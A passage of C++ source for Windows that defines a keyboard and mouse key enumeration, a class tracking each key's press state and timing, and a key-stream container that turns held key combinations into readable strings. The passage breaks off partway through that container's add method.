/* Import */
#include <fcntl.h> // Functional
#include <stdio.h> // Standard Input-Output
#include <time.h> // Time
#include <windows.h> // WIndows

/* Polyfill > ... */
#ifndef CLOCKS_PER_SEC
#define CLOCKS_PER_SEC CLK_TCK
#endif

#ifndef VK_HANGUL
#define VK_HANGUL VK_HANGUEL
#endif

/* Namespace > Keys */
inline namespace Keys {
    /* Class > Key */
    enum Key {
        AdderSymbol,
        Alternate,
        Application,
        Attention,
        Backspace,
        BrowserBackFeed,
        BrowserFavorite,
        BrowserForwardFeed,
        BrowserRefresh,
        BrowserSearch,
        BrowserStart,
        BrowserStop,
        CapitalLock,
        CarriageReturn,
        CharacterA, CharacterB, CharacterC, CharacterD, CharacterE, CharacterF, CharacterG, CharacterH, CharacterI, CharacterJ, CharacterK, CharacterL, CharacterM, CharacterN, CharacterO, CharacterP, CharacterQ, CharacterR, CharacterS, CharacterT, CharacterU, CharacterV, CharacterW, CharacterX, CharacterY, CharacterZ,
        Clear,
        Control,
        ControlBreak,
        CursorSelect,
        Decimal,
        Delete,
        Digit0, Digit1, Digit2, Digit3, Digit4, Digit5, Digit6, Digit7, Digit8, Digit9,
        DividerSymbol,
        DownArrow,
        End,
        EraseEndOfFile,
        Escape,
        Execute,
        ExecuteSelect,
        F1, F2, F3, F4, F5, F6, F7, F8, F9, F10, F11, F12, F13, F14, F15, F16, F17, F18, F19, F20, F21, F22, F23, F24,
        Help,
        Home,
        HorizontalTab,
        IMEAccept, IMEConvert, IMEFinal, IMEHanja, IMEHangul, IMEJunja, IMEKana, IMEKanji, IMEModeChangeRequest, IMENonConvert, IMEProcess,
        Insert,
        LaunchApplication1, LaunchApplication2,
        LeftAlternate,
        LeftArrow,
        LeftControl,
        LeftShift,
        LeftWindowsMeta,
        MediaNextTrack, MediaPlayPause, MediaPreviousTrack, MediaStop,
        MouseLeftButton, MouseMiddleButton, MouseRightButton, MouseX1Button, MouseX2Button,
        MultiplierSymbol,
        NumberLock,
        NumberPad0, NumberPad1, NumberPad2, NumberPad3, NumberPad4, NumberPad5, NumberPad6, NumberPad7, NumberPad8, NumberPad9,
        OEMAdderSymbol,
        OEMClear,
        OEMCommaSymbol,
        OEMMiscellaneous, OEMMiscellaneous1, OEMMiscellaneous2, OEMMiscellaneous3, OEMMiscellaneous4, OEMMiscellaneous5, OEMMiscellaneous6, OEMMiscellaneous7, OEMMiscellaneous8,
        OEMPeriodSymbol,
        OEMSpecific,
        OEMSubtracterSymbol,
        PageDown, PageUp,
        Pause,
        PA1,
        Play,
        Print,
        PrintScreen,
        Reserved,
        RightAlternate,
        RightArrow,
        RightControl,
        RightShift,
        RightWindowsMeta,
        ScrollLock,
        Select,
        SelectMedia,
        Separator,
        Shift,
        Sleep,
        Spacebar,
        StartMail,
        SubtracterSymbol,
        Unassigned,
        Undefined,
        UpArrow,
        VolumeDown,
        VolumeMute,
        VolumeUp,
        Zoom
    };
} using Keys::Key;

/* Class */
    // ...
    class KeyInformation; class KeyStream;

    // Key Information
    class KeyInformation {
        // ...
        friend KeyStream;

        // [...]
        private:
            // Initialization
                // Active Event (Current, Initial) Timestamp
                clock_t activeEventCurrentTimestamp;
                clock_t activeEventInitialTimestamp;

                // Is (Active, Released)
                bool isActive;
                bool isReleased;

        // [...]
        protected:
            // Phase > (Initiate, Update)
            void initiate(const Key key) { this -> key = key; this -> rewind(); }
            inline void initiate(KeyInformation& keyInformation) { this -> activeEventCurrentTimestamp = keyInformation.activeEventCurrentTimestamp; this -> activeEventInitialTimestamp = keyInformation.activeEventInitialTimestamp; this -> isActive = keyInformation.isActive; this -> isReleased = keyInformation.isReleased; this -> key = keyInformation.key; }

            inline void update() { this -> tick(); }

        // [...]
        public:
            // Initialization > (Activated, Key, Released)
            const struct isActive__accessor { private: KeyInformation *keyInformation; public:
                inline isActive__accessor() : keyInformation{NULL} {}
                inline isActive__accessor(KeyInformation* keyInformation) : keyInformation{keyInformation} {}

                inline operator bool() const { return this -> keyInformation -> isActive; }
            } activated;
            Key key;
            const struct isReleased__accessor { private: KeyInformation *keyInformation; public:
                inline isReleased__accessor() : keyInformation{NULL} {}
                inline isReleased__accessor(KeyInformation* keyInformation) : keyInformation{keyInformation} {}

                inline operator bool() const { return this -> keyInformation -> isReleased; }
            } released;
            const struct accessor { private: KeyInformation *keyInformation; public:
                inline accessor() : keyInformation{NULL} {}
                inline accessor(KeyInformation* keyInformation) : keyInformation{keyInformation} {}

                inline operator bool() const { return !(this -> keyInformation -> isActive || this -> keyInformation -> isReleased); }
            } undefined;

            // [Constructor]
            inline KeyInformation() : isActive{false}, isReleased{false}, activated{this}, released{this}, undefined{this} {}
            KeyInformation(const Key key) : isActive{true}, isReleased{false}, activated{this}, released{this}, undefined{this} { this -> initiate(key); }
            KeyInformation(const Key key, const bool isActive) : isActive{isActive}, isReleased{!isActive}, activated{this}, released{this}, undefined{this} { this -> initiate(key); }

            KeyInformation(KeyInformation& keyInformation) : activated{this}, released{this}, undefined{this} { this -> initiate(keyInformation); }
            KeyInformation(KeyInformation&& keyInformation) : activated{this}, released{this}, undefined{this} { this -> initiate((KeyInformation&) keyInformation); }
            KeyInformation(const KeyInformation& keyInformation) : activated{this}, released{this}, undefined{this} { this -> initiate((KeyInformation&) keyInformation); }
            KeyInformation(const KeyInformation&& keyInformation) : activated{this}, released{this}, undefined{this} { this -> initiate((KeyInformation&) keyInformation); }

            // [Operator]
                // [=]
                Key operator =(const Key key) { this -> initiate(key); return key; }

                KeyInformation& operator =(KeyInformation& keyInformation) { this -> initiate(keyInformation); return keyInformation; }
                KeyInformation& operator =(KeyInformation&& keyInformation) { this -> initiate((KeyInformation&) keyInformation); return keyInformation; }
                const KeyInformation& operator =(const KeyInformation& keyInformation) { this -> initiate((KeyInformation&) keyInformation); return keyInformation; }
                const KeyInformation& operator =(const KeyInformation&& keyInformation) { this -> initiate((KeyInformation&) keyInformation); return keyInformation; }

                // [==]
                inline bool operator ==(KeyInformation& keyInformation) const { return this -> activeEventCurrentTimestamp == keyInformation.activeEventCurrentTimestamp && this -> activeEventInitialTimestamp == keyInformation.activeEventInitialTimestamp && this -> isActive == keyInformation.isActive && this -> isReleased == keyInformation.isReleased && this -> key == keyInformation.key; }
                inline bool operator ==(KeyInformation&& keyInformation) const { return this -> activeEventCurrentTimestamp == keyInformation.activeEventCurrentTimestamp && this -> activeEventInitialTimestamp == keyInformation.activeEventInitialTimestamp && this -> isActive == keyInformation.isActive && this -> isReleased == keyInformation.isReleased && this -> key == keyInformation.key; }
                inline bool operator ==(const KeyInformation& keyInformation) const { return this -> activeEventCurrentTimestamp == keyInformation.activeEventCurrentTimestamp && this -> activeEventInitialTimestamp == keyInformation.activeEventInitialTimestamp && this -> isActive == keyInformation.isActive && this -> isReleased == keyInformation.isReleased && this -> key == keyInformation.key; }
                inline bool operator ==(const KeyInformation&& keyInformation) const { return this -> activeEventCurrentTimestamp == keyInformation.activeEventCurrentTimestamp && this -> activeEventInitialTimestamp == keyInformation.activeEventInitialTimestamp && this -> isActive == keyInformation.isActive && this -> isReleased == keyInformation.isReleased && this -> key == keyInformation.key; }

            // Method > Key To String
            inline static const char* keyToString(const Key key) {
                // Logic
                switch (key) {
                    case AdderSymbol: return "+";
                    case Alternate: return "<alternate>";
                    case Application: return "<application>";
                    case Attention: return "<attention>";
                    case Backspace: return "<backspace>";
                    case BrowserBackFeed: return "<browser::back-feed>";
                    case BrowserFavorite: return "<browser::favorite>";
                    case BrowserForwardFeed: return "<browser::forward-feed>";
                    case BrowserRefresh: return "<browser::refresh>";
                    case BrowserSearch: return "<browser::search>";
                    case BrowserStart: return "<browser::start>";
                    case BrowserStop: return "<browser::stop>";
                    case CapitalLock: return "<capital-lock>";
                    case CarriageReturn: return "<carriage-return>";
                    case CharacterA: return "A";
                    case CharacterB: return "B";
                    case CharacterC: return "C";
                    case CharacterD: return "D";
                    case CharacterE: return "E";
                    case CharacterF: return "F";
                    case CharacterG: return "G";
                    case CharacterH: return "H";
                    case CharacterI: return "I";
                    case CharacterJ: return "J";
                    case CharacterK: return "K";
                    case CharacterL: return "L";
                    case CharacterM: return "M";
                    case CharacterN: return "N";
                    case CharacterO: return "O";
                    case CharacterP: return "P";
                    case CharacterQ: return "Q";
                    case CharacterR: return "R";
                    case CharacterS: return "S";
                    case CharacterT: return "T";
                    case CharacterU: return "U";
                    case CharacterV: return "V";
                    case CharacterW: return "W";
                    case CharacterX: return "X";
                    case CharacterY: return "Y";
                    case CharacterZ: return "Z";
                    case Clear: return "<clear>";
                    case Control: return "<control>";
                    case ControlBreak: return "<control-break>";
                    case CursorSelect: return "<select::cursor>";
                    case Decimal: return ".";
                    case Delete: return "<delete>";
                    case Digit0: return "0";
                    case Digit1: return "1";
                    case Digit2: return "2";
                    case Digit3: return "3";
                    case Digit4: return "4";
                    case Digit5: return "5";
                    case Digit6: return "6";
                    case Digit7: return "7";
                    case Digit8: return "8";
                    case Digit9: return "9";
                    case DividerSymbol: return "/";
                    case DownArrow: return "<arrow::down>";
                    case End: return "<end>";
                    case EraseEndOfFile: return "<erase-end-of-file>";
                    case Keys::Escape: return "<escape>";
                    case Execute: return "<execute>";
                    case ExecuteSelect: return "<select::execute>";
                    case F1: return "<F1>";
                    case F2: return "<F2>";
                    case F3: return "<F3>";
                    case F4: return "<F4>";
                    case F5: return "<F5>";
                    case F6: return "<F6>";
                    case F7: return "<F7>";
                    case F8: return "<F8>";
                    case F9: return "<F9>";
                    case F10: return "<F10>";
                    case F11: return "<F11>";
                    case F12: return "<F12>";
                    case F13: return "<F13>";
                    case F14: return "<F14>";
                    case F15: return "<F15>";
                    case F16: return "<F16>";
                    case F17: return "<F17>";
                    case F18: return "<F18>";
                    case F19: return "<F19>";
                    case F20: return "<F20>";
                    case F21: return "<F21>";
                    case F22: return "<F22>";
                    case F23: return "<F23>";
                    case F24: return "<F24>";
                    case Help: return "<help>";
                    case Home: return "<home>";
                    case HorizontalTab: return "<horizontal-tab>";
                    case IMEAccept: return "<ime::accept>";
                    case IMEConvert: return "<ime::convert>";
                    case IMEFinal: return "<ime::final>";
                    case IMEHanja: return "<ime::hanja>";
                    case IMEHangul: return "<ime::hangul>";
                    case IMEJunja: return "<ime::junja>";
                    case IMEKana: return "<ime::kana>";
                    case IMEKanji: return "<ime::kanji>";
                    case IMEModeChangeRequest: return "<ime::mode-change-request>";
                    case IMENonConvert: return "<ime::non-convert>";
                    case IMEProcess: return "<ime::process>";
                    case Insert: return "<insert>";
                    case LaunchApplication1: return "<launch::application-1>";
                    case LaunchApplication2: return "<launch::application-2>";
                    case LeftAlternate: return "<alternate::left>";
                    case LeftArrow: return "<arrow::left>";
                    case LeftControl: return "<control::left>";
                    case LeftShift: return "<shift::left>";
                    case LeftWindowsMeta: return "<windows-meta::left>";
                    case MediaNextTrack: return "<media::next-track>";
                    case MediaPlayPause: return "<media::play-pause>";
                    case MediaPreviousTrack: return "<media::previous-track>";
                    case MediaStop: return "<media::stop>";
                    case MouseLeftButton: return "<mouse::left>";
                    case MouseMiddleButton: return "<mouse::middle>";
                    case MouseRightButton: return "<mouse::right>";
                    case MouseX1Button: return "<mouse::x1>";
                    case MouseX2Button: return "<mouse::x2>";
                    case MultiplierSymbol: return "*";
                    case NumberLock: return "<lock::number>";
                    case NumberPad0: return "<number-pad-0>";
                    case NumberPad1: return "<number-pad-1>";
                    case NumberPad2: return "<number-pad-2>";
                    case NumberPad3: return "<number-pad-3>";
                    case NumberPad4: return "<number-pad-4>";
                    case NumberPad5: return "<number-pad-5>";
                    case NumberPad6: return "<number-pad-6>";
                    case NumberPad7: return "<number-pad-7>";
                    case NumberPad8: return "<number-pad-8>";
                    case NumberPad9: return "<number-pad-9>";
                    case OEMAdderSymbol: return "<oem::adder>";
                    case OEMClear: return "<oem::clear>";
                    case OEMCommaSymbol: return "<oem::comma>";
                    case OEMMiscellaneous: return "<oem::miscellaneous>";
                    case OEMMiscellaneous1: return "<oem::miscellaneous-1>";
                    case OEMMiscellaneous2: return "<oem::miscellaneous-2>";
                    case OEMMiscellaneous3: return "<oem::miscellaneous-3>";
                    case OEMMiscellaneous4: return "<oem::miscellaneous-4>";
                    case OEMMiscellaneous5: return "<oem::miscellaneous-5>";
                    case OEMMiscellaneous6: return "<oem::miscellaneous-6>";
                    case OEMMiscellaneous7: return "<oem::miscellaneous-7>";
                    case OEMMiscellaneous8: return "<oem::miscellaneous-8>";
                    case OEMPeriodSymbol: return "<oem::period>";
                    case OEMSpecific: return "<oem::specific>";
                    case OEMSubtracterSymbol: return "<oem::subtracter>";
                    case PageDown: return "<page::down>";
                    case PageUp: return "<page::up>";
                    case Pause: return "<pause>";
                    case PA1: return "<PA1>";
                    case Play: return "<play>";
                    case Print: return "<print>";
                    case PrintScreen: return "<print::screen>";
                    case Reserved: return "<reserved>";
                    case RightAlternate: return "";
                    case RightArrow: return "<arrow::right>";
                    case RightControl: return "<control::right>";
                    case RightShift: return "<shift::right>";
                    case RightWindowsMeta: return "<windows-meta::right>";
                    case ScrollLock: return "<lock::scroll>";
                    case Select: return "<select>";
                    case SelectMedia: return "<select::media>";
                    case Separator: return "<separator>";
                    case Shift: return "<shift>";
                    case Keys::Sleep: return "<sleep>";
                    case Spacebar: return " ";
                    case StartMail: return "<mail::start>";
                    case SubtracterSymbol: return "-";
                    case Unassigned: return "<unassigned>";
                    case Undefined: return "<undefined>";
                    case UpArrow: return "<arrow::down>";
                    case VolumeDown: return "<volume::down>";
                    case VolumeMute: return "<volume::mute>";
                    case VolumeUp: return "<volume::up>";
                    case Zoom: return "<zoom>";
                }

                // Return
                return NULL;
            }

            // Function > ...
                // [Get]
                inline clock_t getTimeInMilliseconds() { return this -> activeEventCurrentTimestamp - (this -> activeEventInitialTimestamp); }
                inline double getTimeInSeconds() { return ((double) this -> getTimeInMilliseconds()) / (double) CLOCKS_PER_SEC; }

                // [To]
                const char* toString() const { return KeyInformation::keyToString(this -> key); }

                // [...]
                inline void activate() { this -> isActive = true; this -> isReleased = false; this -> rewind(); }
                inline void release() { this -> isActive = false; this -> isReleased = true; } // NOTE (Lapys) -> Allow the activation event timestamp records persist.
                inline void rewind() { this -> activeEventCurrentTimestamp = this -> activeEventInitialTimestamp = ::clock(); }
                inline void tick() { this -> activeEventCurrentTimestamp = ::clock(); this -> isActive = true; this -> isReleased = false; }
    };

    // Key Stream
    class KeyStream {
        // ...
        friend KeyInformation;

        // [...]
        private:
            // Initialization > ... (Value, Length)
            KeyInformation *heapValue;
            KeyInformation stackValue[5];

            const unsigned char stackValueMaximumLength = 5u;
            unsigned char valueLength;

            // Function > Copy
            void copy(KeyStream& keyStream) {
                // Constant > Key Stream Length
                const unsigned char keyStreamLength = keyStream.valueLength;

                // Logic
                if (keyStreamLength > this -> stackValueMaximumLength)
                    // Loop
                    for (unsigned char keyStreamIterator = 0u; keyStreamIterator ^ (this -> stackValueMaximumLength); keyStreamIterator += 1u) {
                        // Modification > Target > [Stack] Value
                        *(this -> stackValue + keyStreamIterator) = *(keyStream.stackValue + keyStreamIterator);

                        // Logic
                        if (keyStreamIterator == this -> stackValueMaximumLength - 1u) {
                            // Loop > Modification > Target > [Heap] Value
                            for (unsigned char keyStreamHeapIterator = 0u; keyStreamIterator ^ keyStreamLength; keyStreamHeapIterator = (keyStreamIterator += 1u) - (this -> stackValueMaximumLength))
                            *(this -> heapValue + keyStreamHeapIterator) = *(keyStream.heapValue + keyStreamHeapIterator);

                            // Terminate
                            keyStreamIterator = this -> stackValueMaximumLength - 1u;
                        }
                    }

                else
                    // Loop > Modification > Target > [Stack] Value
                    for (unsigned char keyStreamIterator = 0u; keyStreamIterator ^ keyStreamLength; keyStreamIterator += 1u)
                    *(this -> stackValue + keyStreamIterator) = *(keyStream.stackValue + keyStreamIterator);
            }

        // [...]
        public:
            // Initialization > Length
            struct valueLength__accessor_mutator {
                // [...]
                private:
                    // Initialization > Key Stream
                    KeyStream *keyStream;

                // [...]
                public:
                    // [Constructor]
                    inline valueLength__accessor_mutator() : keyStream{NULL} {}
                    inline valueLength__accessor_mutator(KeyStream* keyStream) : keyStream{keyStream} {}

                    // [Operator]
                        // [=]
                        unsigned char operator =(const unsigned char length) {
                            // Logic
                            if (length > (this -> keyStream -> valueLength)) {
                                // Logic > Modification > Target > Key Stream > [Heap] Value
                                if (this -> keyStream -> valueLength + length > (this -> keyStream -> stackValueMaximumLength))
                                this -> keyStream -> heapValue = (KeyInformation*) std::realloc(this -> keyStream -> heapValue, ((this -> keyStream -> valueLength - (this -> keyStream -> stackValueMaximumLength)) + length) * sizeof(KeyInformation));

                                // Modification > Target > Key Stream > Value Length
                                this -> keyStream -> valueLength = length;
                            }

                            else if (length < (this -> keyStream -> valueLength)) {
                                // Logic > (Modification > Target > Key Stream > [Heap] Value | Deletion)
                                if (length > (this -> keyStream -> stackValueMaximumLength)) this -> keyStream -> heapValue = (KeyInformation*) std::realloc(this -> keyStream -> heapValue, (length - (this -> keyStream -> stackValueMaximumLength)) * sizeof(KeyInformation));
                                else std::free(this -> keyStream -> heapValue);

                                // Modification > Target > Key Stream > Value Length
                                this -> keyStream -> valueLength = length;
                            }

                            // Return
                            return length;
                        }

                        // [...]
                        inline operator unsigned char() const { return this -> keyStream -> valueLength; }
            } length;

            // [Constructor]
            inline KeyStream() : heapValue{NULL}, stackValueMaximumLength{5u}, valueLength{0u}, length{this} {}

            KeyStream(KeyStream& keyStream) { this -> copy(keyStream); }
            KeyStream(KeyStream&& keyStream) { this -> copy((KeyStream&) keyStream); }
            KeyStream(const KeyStream& keyStream) { this -> copy((KeyStream&) keyStream); }
            KeyStream(const KeyStream&& keyStream) { this -> copy((KeyStream&) keyStream); }

            // [Destructor]
            ~KeyStream() { std::free(this -> heapValue); }

            // [Operator] > [=]
            KeyStream& operator =(KeyStream& keyStream) { this -> copy(keyStream); return keyStream; }
            KeyStream& operator =(KeyStream&& keyStream) { this -> copy((KeyStream&) keyStream); return keyStream; }
            const KeyStream& operator =(const KeyStream& keyStream) { this -> copy((KeyStream&) keyStream); return keyStream; }
            const KeyStream& operator =(const KeyStream&& keyStream) { this -> copy((KeyStream&) keyStream); return keyStream; }

            // Method
                // Key To String
                static const char* keyToString(KeyStream& keyStream, const Key key) {
                    // Logic > Return
                    switch (key) {
                        // [Control Keys]
                        case Alternate:
                            if (keyStream.has(LeftAlternate)) return KeyInformation::keyToString(LeftAlternate);
                            else if (keyStream.has(RightAlternate)) return KeyInformation::keyToString(RightAlternate);
                            else return KeyInformation::keyToString(Alternate);

                        case CharacterA: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'A'"; else return "'a'";
                        case CharacterB: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'B'"; else return "'b'";
                        case CharacterC: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'C'"; else return "'c'";
                        case CharacterD: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'D'"; else return "'d'";
                        case CharacterE: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'E'"; else return "'e'";
                        case CharacterF: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'F'"; else return "'f'";
                        case CharacterG: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'G'"; else return "'g'";
                        case CharacterH: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'H'"; else return "'h'";
                        case CharacterI: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'I'"; else return "'i'";
                        case CharacterJ: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'J'"; else return "'j'";
                        case CharacterK: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'K'"; else return "'k'";
                        case CharacterL: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'L'"; else return "'l'";
                        case CharacterM: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'M'"; else return "'m'";
                        case CharacterN: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'N'"; else return "'n'";
                        case CharacterO: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'O'"; else return "'o'";
                        case CharacterP: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'P'"; else return "'p'";
                        case CharacterQ: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'Q'"; else return "'q'";
                        case CharacterR: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'R'"; else return "'r'";
                        case CharacterS: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'S'"; else return "'s'";
                        case CharacterT: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'T'"; else return "'t'";
                        case CharacterU: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'U'"; else return "'u'";
                        case CharacterV: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'V'"; else return "'v'";
                        case CharacterW: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'W'"; else return "'w'";
                        case CharacterX: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'X'"; else return "'x'";
                        case CharacterY: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'Y'"; else return "'y'";
                        case CharacterZ: if (keyStream.has(CapitalLock) || keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'Z'"; else return "'z'";

                        case Control:
                            if (keyStream.has(LeftControl)) return KeyInformation::keyToString(LeftControl);
                            else if (keyStream.has(RightControl)) return KeyInformation::keyToString(RightControl);
                            else return KeyInformation::keyToString(Control);

                        case Digit0: if (keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "')'"; else return "'0'";
                        case Digit1: if (keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'!'"; else return "'1'";
                        case Digit2: if (keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'@'"; else return "'2'";
                        case Digit3: if (keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'#'"; else return "'3'";
                        case Digit4: if (keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'$'"; else return "'4'";
                        case Digit5: if (keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'%'"; else return "'5'";
                        case Digit6: if (keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'^'"; else return "'6'";
                        case Digit7: if (keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'&'"; else return "'7'";
                        case Digit8: if (keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'*'"; else return "'8'";
                        case Digit9: if (keyStream.has(LeftShift) || keyStream.has(RightShift) || keyStream.has(Shift)) return "'('"; else return "'9'";

                        case Shift:
                            if (keyStream.has(LeftShift)) return KeyInformation::keyToString(LeftShift);
                            else if (keyStream.has(RightShift)) return KeyInformation::keyToString(RightShift);
                            else return KeyInformation::keyToString(Shift);

                        // [...]
                        default: {
                            // Constant > Buffer
                            const char *buffer = KeyInformation::keyToString(key);

                            // Logic
                            if (NULL == buffer)
                                // Return
                                return buffer;

                            else {
                                // Logic > Return
                                if (*buffer == '\0') return "\"\"";
                                else if (*(buffer + 1) == '\0') { static char string[4] {'\'', 0, '\'', '\0'}; *(string + 1) = *buffer; return string; }
                                else return buffer;
                            }
                        }
                    }

                    // Return
                    return NULL;
                }
                static const char* keyToString(KeyStream&& keyStream, const Key key) { return KeyStream::keyToString((KeyStream&) keyStream, key); }
                static const char* keyToString(const KeyStream& keyStream, const Key key) { return KeyStream::keyToString((KeyStream&) keyStream, key); }
                static const char* keyToString(const KeyStream&& keyStream, const Key key) { return KeyStream::keyToString((KeyStream&) keyStream, key); }

                // Key Information To String
                static const char* keyInformationToString(KeyStream& keyStream, KeyInformation& keyInformation) { return KeyStream::keyToString(keyStream, keyInformation.key); }
                static const char* keyInformationToString(KeyStream& keyStream, KeyInformation&& keyInformation) { return KeyStream::keyInformationToString(keyStream, (KeyInformation&) keyInformation); }
                static const char* keyInformationToString(KeyStream& keyStream, const KeyInformation& keyInformation) { return KeyStream::keyInformationToString(keyStream, (KeyInformation&) keyInformation); }
                static const char* keyInformationToString(KeyStream& keyStream, const KeyInformation&& keyInformation) { return KeyStream::keyInformationToString(keyStream, (KeyInformation&) keyInformation); }

                static const char* keyInformationToString(KeyStream&& keyStream, KeyInformation& keyInformation) { return KeyStream::keyInformationToString((KeyStream&) keyStream, keyInformation); }
                static const char* keyInformationToString(KeyStream&& keyStream, KeyInformation&& keyInformation) { return KeyStream::keyInformationToString((KeyStream&) keyStream, (KeyInformation&) keyInformation); }
                static const char* keyInformationToString(KeyStream&& keyStream, const KeyInformation& keyInformation) { return KeyStream::keyInformationToString((KeyStream&) keyStream, (KeyInformation&) keyInformation); }
                static const char* keyInformationToString(KeyStream&& keyStream, const KeyInformation&& keyInformation) { return KeyStream::keyInformationToString((KeyStream&) keyStream, (KeyInformation&) keyInformation); }

                static const char* keyInformationToString(const KeyStream& keyStream, KeyInformation& keyInformation) { return KeyStream::keyInformationToString((KeyStream&) keyStream, keyInformation); }
                static const char* keyInformationToString(const KeyStream& keyStream, KeyInformation&& keyInformation) { return KeyStream::keyInformationToString((KeyStream&) keyStream, (KeyInformation&) keyInformation); }
                static const char* keyInformationToString(const KeyStream& keyStream, const KeyInformation& keyInformation) { return KeyStream::keyInformationToString((KeyStream&) keyStream, (KeyInformation&) keyInformation); }
                static const char* keyInformationToString(const KeyStream& keyStream, const KeyInformation&& keyInformation) { return KeyStream::keyInformationToString((KeyStream&) keyStream, (KeyInformation&) keyInformation); }

                static const char* keyInformationToString(const KeyStream&& keyStream, KeyInformation& keyInformation) { return KeyStream::keyInformationToString((KeyStream&) keyStream, keyInformation); }
                static const char* keyInformationToString(const KeyStream&& keyStream, KeyInformation&& keyInformation) { return KeyStream::keyInformationToString((KeyStream&) keyStream, (KeyInformation&) keyInformation); }
                static const char* keyInformationToString(const KeyStream&& keyStream, const KeyInformation& keyInformation) { return KeyStream::keyInformationToString((KeyStream&) keyStream, (KeyInformation&) keyInformation); }
                static const char* keyInformationToString(const KeyStream&& keyStream, const KeyInformation&& keyInformation) { return KeyStream::keyInformationToString((KeyStream&) keyStream, (KeyInformation&) keyInformation); }

            // Function
                // Add [Key Information]
                void add(KeyInformation& keyInformation) {
                    // Logic
                    if (this -> valueLength) {
                        // Logic
                        if (this -> valueLength == this -> stackValueMaximumLength) {
                            // Loop
                            for (unsigned char valueIterator = 0u; valueIterator ^ (this -> stackValueMaximumLength); valueIterator += 1u)
                                // Logic
                                if ((this -> stackValue + valueIterator) -> key == keyInformation.key)
                                    // Terminate
                                    valueIterator = this -> stackValueMaximumLength - 1u;

                                else if (valueIterator == this -> stackValueMaximumLength - 1u) {
                                    // Modification > Target > [Heap] Value (Length)
                                    this -> heapValue = (KeyInformation*) std::malloc(sizeof(KeyInformation));
                                    *(this -> heapValue) = keyInformation;

                                    this -> valueLength = this -> stackValueMaximumLength + 1u;
                                }
                        }

                        else if (this -> valueLength > this -> stackValueMaximumLength) {
                            // Loop
                            for (unsigned char valueIterator = 0u; valueIterator ^ (this -> stackValueMaximumLength); valueIterator += 1u)
                                // Logic
                                if ((this -> stackValue + valueIterator) -> key == keyInformation.key)
                                    // Terminate
                                    valueIterator = this -> stackValueMaximumLength - 1u;

                                else if (valueIterator == this -> stackValueMaximumLength - 1u) {
                                    // Loop
                                    for (unsigned char heapValueIterator = 0u; valueIterator ^ (this -> valueLength); heapValueIterator = (valueIterator += 1u) - (this -> stackValueMaximumLength))
                                        // Logic
                                        if ((this -> heapValue + heapValueIterator) -> key == keyInformation.key)
                                            // Terminate
                                            valueIterator = this -> valueLength - 1u;

                                        else if (valueIterator == this -> valueLength - 1u) {
                                            // Shorthand > Heap Value Length
                                            const unsigned char heapValueLength = this -> valueLength - (this -> stackValueMaximumLength);

                                            // Modification > Target > [Heap] Value (Length)
                                            this -> heapValue = (KeyInformation*) std::realloc(this -> heapValue, (heapValueLength + 1u) * sizeof(KeyInformation));
                                            *(this -> heapValue + heapValueLength) = keyInformation;

                                            this -> valueLength += 1u;

                                            // Terminate
                                            valueIterator = this -> valueLength - 1u;
                                        }

                                    // Terminate
                                    valueIterator = this -> stackValueMaximumLength - 1u;
                                }
                        }

                        else
                            // Loop
